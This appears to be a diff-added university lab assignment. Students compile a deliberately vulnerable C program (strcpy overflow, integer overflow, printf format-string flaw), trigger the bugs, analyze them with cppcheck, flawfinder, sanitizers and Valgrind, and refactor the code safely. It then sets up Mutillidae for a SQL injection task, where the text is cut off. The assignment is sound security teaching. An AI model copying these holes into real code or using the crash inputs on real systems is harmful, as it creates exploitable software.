+<p>This section guides you through analyzing and comparing the behavior of a vulnerable C program compiled with and without modern protections.</p>
+<hr>
+<h3 id="-task-1-compile-the-vulnerable-program-and-compare-stack-protection-10-points">🔸 <strong>Task 1: Compile the Vulnerable Program and Compare Stack Protection (10 Points)</strong> </h3>
+<p>This task demonstrates the impact of compiler-based security features (stack canaries and executable stack flags) using a buffer overflow vulnerability.</p>
+<hr>
+<h4 id="step-1-prepare-the-c-source-file"><strong>Step 1: Prepare the C Source File</strong> </h4>
+<p>Create a file named <code>vulnerable_code.c</code> and paste the following code:</p>
+<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;limits.h&gt;</span></span>
+
+<span class="token keyword keyword-void">void</span> <span class="token function">buffer_overflow</span><span class="token punctuation">(</span><span class="token keyword keyword-char">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword keyword-char">char</span> buffer<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// VULNERABLE: No bounds check</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Buffer received: %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword keyword-void">void</span> <span class="token function">integer_overflow</span><span class="token punctuation">(</span><span class="token keyword keyword-char">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword keyword-int">int</span> count <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword keyword-int">int</span> width <span class="token operator">=</span> <span class="token keyword keyword-sizeof">sizeof</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword keyword-int">int</span> total <span class="token operator">=</span> count <span class="token operator">*</span> width<span class="token punctuation">;</span>
+
+    <span class="token keyword keyword-int">int</span> <span class="token operator">*</span>arr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory allocation failed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword keyword-return">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword keyword-for">for</span> <span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocated array of %d integers.\n"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword keyword-void">void</span> <span class="token function">format_string_vuln</span><span class="token punctuation">(</span><span class="token keyword keyword-char">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// VULNERABLE: Format string flaw</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> argc<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &lt;overflow|int|format&gt; &lt;input&gt;\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword keyword-return">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"overflow"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">buffer_overflow</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword keyword-else">else</span> <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"int"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">integer_overflow</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword keyword-else">else</span> <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"format"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">format_string_vuln</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword keyword-else">else</span> <span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Unknown option: %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword keyword-return">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre><hr>
+<h4 id="step-2-compile-two-versions"><strong>Step 2: Compile Two Versions</strong> </h4>
+<p><strong>A. Without Stack Protection (Vulnerable Binary):</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>gcc <span class="token parameter variable">-o</span> vuln_noprotection -fno-stack-protector <span class="token parameter variable">-z</span> execstack vulnerable_code.c
+</code></pre><p><strong>B. With Stack Protection (Hardened Binary):</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>gcc <span class="token parameter variable">-o</span> vuln_protected -fstack-protector <span class="token parameter variable">-z</span> noexecstack vulnerable_code.c
+</code></pre><hr>
+<h4 id="step-3-trigger-buffer-overflow"><strong>Step 3: Trigger Buffer Overflow</strong> </h4>
+<p>You will send an input longer than <code>buffer[10]</code>. Try progressively increasing input length.</p>
+<p><strong>Example:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./vuln_noprotection overflow AAAAAAAAAAAAAAAA
+./vuln_protected overflow AAAAAAAAAAAAAAAA
+</code></pre><p>Alternatively:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>perl <span class="token parameter variable">-e</span> <span class="token string">'print "A"x16'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> ./vuln_noprotection overflow <span class="token punctuation">{</span><span class="token punctuation">}</span>
+</code></pre><p>Gradually test with more <code>A</code>s (20, 24, 28, etc.) until a segmentation fault or crash is observed.</p>
+<hr>
+<h4 id="step-4-analyze-behavior"><strong>Step 4: Analyze Behavior</strong> </h4>
+<ul>
+<li>
+<p>On <strong><code>vuln_noprotection</code></strong>:</p>
+<ul>
+<li>Expect possible segmentation fault or silent crash.</li>
+<li>The overflow may corrupt the return address.</li>
+</ul>
+</li>
+<li>
+<p>On <strong><code>vuln_protected</code></strong>:</p>
+<ul>
+<li>Should trigger a runtime error:<pre data-role="codeBlock" data-info="" class="language-text"><code>*** stack smashing detected ***: terminated
+</code></pre></li>
+<li>May log details in <code>dmesg</code>:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">dmesg</span> <span class="token operator">|</span> <span class="token function">tail</span>
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="-analyze-and-respond-1">🔍 <strong>Analyze and Respond:</strong> </h3>
+<ol>
+<li>What role do stack canaries play in stopping a buffer overflow?</li>
+<li>Why does <code>vuln_protected</code> terminate gracefully while <code>vuln_noprotection</code> crashes?</li>
+<li>Does the use of <code>-z execstack</code> make any difference in your tests?</li>
+<li>What would happen if shellcode were included in the overflow string?</li>
+<li>How could an attacker use this vulnerability if stack protection is off?</li>
+<li>why <code>dmesg</code> logs <code>vuln_noprotection</code> segmentation fault, but not the <code>vuln_protected</code> error?</li>
+</ol>
+<hr>
+<h4 id="deliverables-for-task-1"><strong>Deliverables for Task 1</strong> </h4>
+<ul>
+<li><strong>Screenshots</strong>:
+<ul>
+<li>Commands used to compile both versions.</li>
+<li>Buffer overflow triggering in each version.</li>
+<li>Any error messages or segmentation faults.</li>
+<li><code>dmesg</code> logs</li>
+</ul>
+</li>
+<li>Answer to analysis questions.</li>
+</ul>
+<hr>
+<h3 id="-task-2-static-analysis-with-cppcheck-and-flawfinder-10-points">🔸 <strong>Task 2: Static Analysis with Cppcheck and Flawfinder (10 Points)</strong> </h3>
+<p><strong>Goal</strong>: Use two static analysis tools to uncover vulnerabilities in <code>vulnerable_code.c</code>. Evaluate how well each tool detects the buffer overflow, integer overflow, and format string vulnerabilities. Then, compare the tools and critically analyze their coverage, accuracy, and usefulness in secure software development.</p>
+<p><strong>Note</strong>: install <code>cppcheck</code> and <code>flawfinder</code> if needed.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>sudo apt install cppcheck flawfinder
+</code></pre><hr>
+<h4 id="️-step-1-run-cppcheck">🛠️ <strong>Step 1: Run Cppcheck</strong> </h4>
+<p>Cppcheck is a general-purpose static analysis tool that can help identify logical errors, memory issues, and unsafe constructs.</p>
+<p><strong>Command</strong>:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>cppcheck <span class="token parameter variable">--enable</span><span class="token operator">=</span>all <span class="token parameter variable">--inconclusive</span> vulnerable_code.c <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> cppcheck_output.txt
+</code></pre><p><strong>Look for</strong>:</p>
+<ul>
+<li>Any messages related to:
+<ul>
+<li>Dangerous or unchecked use of <code>strcpy</code>, <code>printf</code>, or <code>malloc</code></li>
+<li>Buffer overflows</li>
+<li>Use of <code>atoi</code> (which lacks overflow detection)</li>
+<li>Array access or pointer arithmetic issues</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="️-step-2-run-flawfinder">🛠️ <strong>Step 2: Run Flawfinder</strong> </h4>
+<p>Flawfinder is more security-focused and provides CWE references and risk levels.</p>
+<p><strong>Command</strong>:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>flawfinder vulnerable_code.c <span class="token operator">&gt;</span> flawfinder_output.txt
+</code></pre><p><strong>Look for</strong>:</p>
+<ul>
+<li>CWE identifiers for each vulnerability.</li>
+<li>Warnings about unbounded memory copy or unsafe format handling</li>
+</ul>
+<hr>
+<h4 id="-step-3-analyze-and-compare">📊 <strong>Step 3: Analyze and Compare</strong> </h4>
+<p>Fill each cell based on the tool outputs and explain any discrepancies or insights in the <strong>Notes / Observations</strong> column.</p>
+<table>
+<thead>
+<tr>
+<th>Vulnerability Description</th>
+<th>Detected by Cppcheck?</th>
+<th>Detected by Flawfinder?</th>
+<th>CWE Tag(s) (Flawfinder)</th>
+<th>Risk Level (Flawfinder)</th>
+<th>Notes / Observations</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Use of <code>strcpy()</code> (buffer overflow)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Use of <code>atoi()</code> (integer overflow)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Format string <code>printf()</code></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Fixed-size buffer (e.g., <code>char buffer[10]</code>)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="-analyze-and-respond-2">❓ <strong>Analyze and Respond</strong> </h4>
+<p>Respond to the following questions in your report:</p>
+<ol>
+<li><strong>Why do tools like Flawfinder flag <code>strcpy</code> and <code>printf(input)</code> but not always <code>atoi</code>-based overflows?</strong></li>
+<li><strong>What limitations does Cppcheck have in catching deep memory or type misuse?</strong></li>
+<li><strong>What CWE tags did Flawfinder report, and what do they mean in terms of exploitation risk?</strong></li>
+<li><strong>How would manual code review complement automated static analysis?</strong></li>
+<li><strong>What strategies could you use to improve detection of integer overflows or logic flaws beyond what these tools catch?</strong></li>
+</ol>
+<hr>
+<h4 id="deliverables-for-task-2"><strong>Deliverables for Task 2</strong> </h4>
+<ul>
+<li>Screenshots:
+<ul>
+<li><strong>Cppcheck output</strong> with visible warnings</li>
+<li><strong>Flawfinder output</strong> with CWE and risk ratings</li>
+</ul>
+</li>
+<li>The comppleted <strong>comparison table</strong>.</li>
+<li><strong>Answers</strong> to the critical thinking questions</li>
+</ul>
+<hr>
+<h3 id="-task-3-dynamic-memory-analysis-with-gcc-asan-ubsan-and-valgrind-20-points">🔸 <strong>Task 3: Dynamic Memory Analysis with GCC ASan, UBSan and Valgrind (20 Points)</strong> </h3>
+<p><strong>Goal</strong>: Use three dynamic analysis tools, <strong>GCC AddressSanitizer (ASan)</strong>, <strong>GCC Undefined Behavior Sanitizer (UBSan)</strong> and <strong>Valgrind Memcheck</strong>, to detect memory-related issues caused by buffer overflows, unsafe input parsing, and format string vulnerabilities in <code>vulnerable_code.c</code>.</p>
+<p>You will trigger each vulnerability and observe how these tools report the issues.</p>
+<hr>
+<h4 id="-step-1-compile-with-addresssanitizer-asan-and-undefined-behavior-sanitizer-ubsan">🔹 <strong>Step 1: Compile with AddressSanitizer (ASan) and Undefined Behavior Sanitizer (UBSan)</strong> </h4>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>gcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-fsanitize</span><span class="token operator">=</span>address <span class="token parameter variable">-o</span> vuln_asan vulnerable_code.c
+gcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-fsanitize</span><span class="token operator">=</span>undefined <span class="token parameter variable">-o</span> vuln_ubsan vulnerable_code.c
+</code></pre><hr>
+<h4 id="-step-2-run-asan-and-ubsan-for-each-vulnerability">🔹 <strong>Step 2: Run ASan and UBSan for Each Vulnerability</strong> </h4>
+<p>You will now run <code>vuln_asan</code> and <code>vuln_ubsan</code> three times, once for each vulnerable function:</p>
+<h5 id="1-buffer-overflow">1. <strong>Buffer Overflow</strong> </h5>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./vuln_asan overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+./vuln_ubsan overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+</code></pre><h5 id="2-integer-overflow">2. <strong>Integer Overflow</strong> </h5>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./vuln_asan int <span class="token number">1073741824</span>
+./vuln_ubsan int <span class="token number">1073741824</span>
+</code></pre><ul>
+<li>This input may cause <code>count * sizeof(int)</code> to overflow and trigger malloc issues.</li>
+</ul>
+<h5 id="3-format-string">3. <strong>Format String</strong> </h5>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./vuln_asan <span class="token function">format</span> %x%x%x%x%x%x%x
+./vuln_ubsan <span class="token function">format</span> %x%x%x%x%x%x%x
+</code></pre><hr>
+<h4 id="-step-3-run-with-valgrind-memcheck">🔹 <strong>Step 3: Run with Valgrind Memcheck</strong> </h4>
+<p>Now run the <strong>same inputs</strong> using the <strong>unprotected</strong> version of your compiled program:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>gcc <span class="token parameter variable">-g</span> -fno-stack-protector <span class="token parameter variable">-z</span> execstack <span class="token parameter variable">-o</span> vuln_unprotected vulnerable_code.c
+</code></pre><p>Run Valgrind on it:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>valgrind --leak-check<span class="token operator">=</span>full --track-origins<span class="token operator">=</span>yes ./vuln_unprotected overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+valgrind --leak-check<span class="token operator">=</span>full --track-origins<span class="token operator">=</span>yes ./vuln_unprotected int <span class="token number">1073741824</span>
+valgrind --leak-check<span class="token operator">=</span>full --track-origins<span class="token operator">=</span>yes ./vuln_unprotected <span class="token function">format</span> %x%x%x%x
+</code></pre><p>🔍 <strong>Look for</strong>:</p>
+<ul>
+<li><strong>Invalid write/read</strong> errors</li>
+<li><strong>Uninitialized values</strong></li>
+<li><strong>Heap/memory corruption</strong></li>
+<li>Format string misuse may not be fully caught by Valgrind, note this in your comparison.</li>
+</ul>
+<hr>
+<h4 id="-step-4-tool-comparison-table-asan-vs-ubsan-vs-valgrind">📊 <strong>Step 4: Tool Comparison Table: ASan vs. UBSan vs. Valgrind</strong> </h4>
+<p>Here is the cleared version of your comparison table for students to complete:</p>
+<table>
+<thead>
+<tr>
+<th>Vulnerability Type</th>
+<th>Detected by ASan?</th>
+<th>ASan Message Summary</th>
+<th>Detected by UBSan?</th>
+<th>UBSan Message Summary</th>
+<th>Detected by Valgrind?</th>
+<th>Notes / Observations</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Buffer Overflow (<code>strcpy</code>)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Integer Overflow (<code>atoi</code> + <code>malloc</code>)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Format String (<code>printf(input)</code>)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h5 id="-guidelines">🔍 Guidelines: </h5>
+<ul>
+<li><strong>Detected?</strong> → Yes / No / Partially</li>
+<li><strong>Output Summary</strong> → Briefly describe what the tool reported (e.g., segmentation fault, stack buffer overflow, heap misuse, etc.).</li>
+<li><strong>Notes / Observations</strong> → Mention any crashes, limitations, or unexpected behavior.</li>
+</ul>
+<hr>
+<h4 id="-analyze-and-respond-3">🔍 <strong>Analyze and Respond:</strong> </h4>
+<ol>
+<li><strong>Which tool gave clearer diagnostics for each vulnerability? Which tool missed each vulnerability? Why?</strong></li>
+<li><strong>Why do all three tools (ASan, UBSan, Valgrind) fail to detect the format string vulnerability?</strong></li>
+<li><strong>Was one tool better at identifying heap vs. stack issues?</strong></li>
+<li><strong>Would you use all these tools together? Why or why not?</strong></li>
+<li><strong>How do these tools help developers beyond catching crashes (e.g., explaining memory layout, invalid access causes)?</strong></li>
+</ol>
+<hr>
+<h4 id="-deliverables-for-task-3">📌 <strong>Deliverables for Task 3</strong> </h4>
+<ul>
+<li>
+<p>📷 <strong>Screenshots</strong>:</p>
+<ul>
+<li>AddressSanitizer output (1 for each vulnerability)</li>
+<li>UBSan output (1 for each vulnerability)</li>
+<li>Valgrind output (1 for each vulnerability)</li>
+</ul>
+</li>
+<li>
+<p>📄 <strong>Completed Comparison Table</strong>.</p>
+</li>
+<li>
+<p>💬 <strong>Answers to analysis questions</strong>.</p>
+</li>
+</ul>
+<hr>
+<h3 id="-task-4-mitigation-recommendations-and-secure-refactoring-10-points">🔸 <strong>Task 4: Mitigation Recommendations and Secure Refactoring (10 Points)</strong> </h3>
+<p><strong>Goal</strong>: Identify root causes of the vulnerabilities demonstrated in the assignment and apply secure programming principles to refactor all three vulnerable functions: buffer overflow, integer overflow, and format string misuse.</p>
+<hr>
+<h4 id="-step-1-analyze-the-root-causes">🔹 <strong>Step 1: Analyze the Root Causes</strong> </h4>
+<p>For each of the three functions in <code>vulnerable_code.c</code>:</p>
+<ol>
+<li><strong>Explain</strong> why the implementation is unsafe.</li>
+<li><strong>Identify</strong> which specific function call or logic introduces the vulnerability.</li>
+<li><strong>Reflect</strong> on why such patterns (e.g., unchecked <code>strcpy</code>, unvalidated <code>atoi</code>, unsanitized format strings) still appear in legacy or performance-critical codebases.</li>
+</ol>
+<p>Use the format below for each vulnerability:</p>
+<pre data-role="codeBlock" data-info="text" class="language-text text"><code>Vulnerability: Buffer Overflow
+
+Root Cause Explanation:
+- The `strcpy()` function copies user input directly into a fixed-size buffer without....
+
+</code></pre><p>Repeat for integer overflow and format string misuse.</p>
+<hr>
+<h4 id="-step-2-propose-safer-alternatives">🔹 <strong>Step 2: Propose Safer Alternatives</strong> </h4>
+<p>For <strong>each of the three vulnerabilities</strong>, list <strong>at least one safer alternative</strong>, explain <strong>why it is more secure</strong>, and discuss any <strong>limitations or trade-offs</strong>.</p>
+<p><strong>Example</strong>:</p>
+<pre data-role="codeBlock" data-info="text" class="language-text text"><code>Vulnerability: Buffer Overflow
+
+Safer Alternative: `strn...()``
+
+Why Safer:
+- Function includes buffer length as a parameter, limiting the amount of ....
+
+Limitations:
+- `strncpy()` may not null-terminate the destination if the source is too long.
+</code></pre><p>Repeat this structure for <code>atoi</code>and format string.</p>
+<hr>
+<h4 id="-step-3-refactor-all-three-vulnerable-functions">🔹 <strong>Step 3: Refactor All Three Vulnerable Functions</strong> </h4>
+<p>Create a <strong>new, safer version</strong> of your code called <code>protected_code.c</code> that includes:</p>
+<ol>
+<li><strong>Refactored <code>buffer_overflow()</code> function</strong> using size-checked input copy or safe bound checking.</li>
+<li><strong>Refactored <code>integer_overflow()</code> function</strong> using safer conversion and overflow checks.</li>
+<li><strong>Refactored <code>format_string_vuln()</code> function</strong> using safe formatting practices.</li>
+</ol>
+<p>Your refactored code must:</p>
+<ul>
+<li>Use secure alternatives discussed in Step 2.</li>
+<li>Perform proper <strong>bounds checking</strong> and <strong>input validation</strong>.</li>
+<li>Include basic <strong>error handling</strong> for robustness.</li>
+<li>Retain the original structure and demo functionality.</li>
+</ul>
+<p>Provide the full updated source code under the filename: <code>protected_code.c</code>.</p>
+<hr>
+<h4 id="-step-4-defensive-compiler-options">🔹 <strong>Step 4: Defensive Compiler Options</strong> </h4>
+<p>Document two compiler-level mitigations used during this assignment and answer the following for each:</p>
+<ol>
+<li><strong>Mitigation Name</strong>: (e.g., ... Canaries)</li>
+<li><strong>Purpose and Protection</strong>:
+<ul>
+<li>What kind of exploitation does this defend against?</li>
+<li>How does it work internally?</li>
+</ul>
+</li>
+<li><strong>How to Enable or Disable</strong> in GCC:
+<ul>
+<li>Show the specific flags (e.g., <code>-fstack-protector</code>, <code>-z noexecstack</code>).</li>
+</ul>
+</li>
+<li><strong>Limitations</strong>:
+<ul>
+<li>Can it be bypassed?</li>
+<li>Does it protect against all types of memory corruption?</li>
+</ul>
+</li>
+</ol>
+<p><strong>Example</strong>:</p>
+<pre data-role="codeBlock" data-info="text" class="language-text text"><code>Mitigation: ... Canaries
+
+Purpose: Detects overwrites of the return address on the stack by .....
+
+Enabled by: `-fstack-protector`  
+Disabled by: `-fno-stack-protector`
+
+Limitations: Does not protect heap memory. Can be bypassed using ....
+</code></pre><hr>
+<h4 id="-analyze-and-respond-4">🔹 <strong>Analyze and Respond</strong> </h4>
+<p>Answer the following questions:</p>
+<ol>
+<li><strong>Why are memory-safe languages (like Rust or Go) gaining adoption in security-critical systems?</strong></li>
+<li><strong>Why do developers continue to use C despite well-known memory safety risks?</strong></li>
+<li><strong>How does secure memory handling relate to the secure software development lifecycle (SSDLC)?</strong></li>
+<li><strong>How could early use of static and dynamic analysis tools help prevent such issues in larger codebases?</strong></li>
+</ol>
+<hr>
+<h4 id="-deliverables-for-task-4">📌 <strong>Deliverables for Task 4</strong> </h4>
+<ul>
+<li>Clear explanation of root causes for each vulnerability (Step 1).</li>
+<li>Table or bullet points listing secure alternatives, with rationale and trade-offs (Step 2).</li>
+<li>Full refactored C source code: <code>protected_code.c</code> (Step 3).</li>
+<li>Description of compiler mitigations with answers to all sub-questions (Step 4).</li>
+<li>Well-reasoned answers to analysis questions.</li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="part-3-web-exploitation-with-mutillidae-50-points"><strong>Part 3: Web Exploitation with Mutillidae (50 Points)</strong> </h2>
+<p><strong>Goal</strong>: Analyze and exploit multiple web vulnerabilities in <strong>Mutillidae</strong> on Metasploitable-2. You will investigate <strong>SQL Injection</strong>, <strong>Command Injection</strong>, and <strong>Cross-Site Scripting (XSS)</strong> vulnerabilities, understand their underlying logic, demonstrate the attacks, and recommend security improvements.</p>
+<h3 id="task-0-preparing-the-environment">Task 0: Preparing the Environment </h3>
+<p>A common issue with Mutillidae on Metasploitable 2 is that the application is configured by default to use a database named <code>owasp10</code>. To resolve this, you'll need to update Mutillidae's configuration to reference the correct database. Here's how you can do it:</p>
+<ol>
+<li>
+<p><strong>Locate the Configuration File</strong>:</p>
+<ul>
+<li>The main configuration file for Mutillidae is <code>config.inc</code>. In Metasploitable 2, this file is typically located in the <code>/var/www/mutillidae/</code> directory.</li>
+</ul>
+</li>
+<li>
+<p><strong>Edit the Configuration File</strong>:</p>
+<ul>
+<li>Open the terminal in Metasploitable 2.</li>
+<li>Navigate to the Mutillidae directory:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token builtin class-name">cd</span> /var/www/mutillidae/
+</code></pre></li>
+<li>Open the <code>config.inc</code> file with a text editor such as <code>nano</code>:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">sudo</span> <span class="token function">nano</span> config.inc
+</code></pre></li>
+<li>Locate the line that sets the database name. It might look like:<pre data-role="codeBlock" data-info="php" class="language-php php"><code><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'metasploit'</span><span class="token punctuation">;</span>
+</code></pre></li>
+<li>Change <code>'metasploit'</code> to <code>'owasp10'</code>:<pre data-role="codeBlock" data-info="php" class="language-php php"><code><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'owasp10'</span><span class="token punctuation">;</span>
+</code></pre></li>
+<li>Save the changes and exit the editor (in <code>nano</code>, you can do this by pressing <code>Ctrl+X</code>, then <code>Y</code>, and then <code>Enter</code>).</li>
+</ul>
+</li>
+<li>
+<p><strong>Restart the Apache Server</strong>:</p>
+<ul>
+<li>For the changes to take effect, restart the Apache server:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">sudo</span> /etc/init.d/apache2 restart
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Reset the Mutillidae Database</strong>:</p>
+<ul>
+<li>Open your web browser on Kali Linux and navigate to the Mutillidae application at <code>http://&lt;M2-IP&gt;/mutillidae/index.php</code>.</li>
+<li>Click on the "Reset DB" link provided on the Mutillidae homepage. This action will initialize the database schema and populate it with the necessary data.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="-task-1-sql-injection-10-points">🔹 <strong>Task 1: SQL Injection (10 Points)</strong> </h3>
+<p><strong>Objective</strong>: Exploit SQL Injection on the Mutillidae login page to bypass authentication.</p>
+<hr>
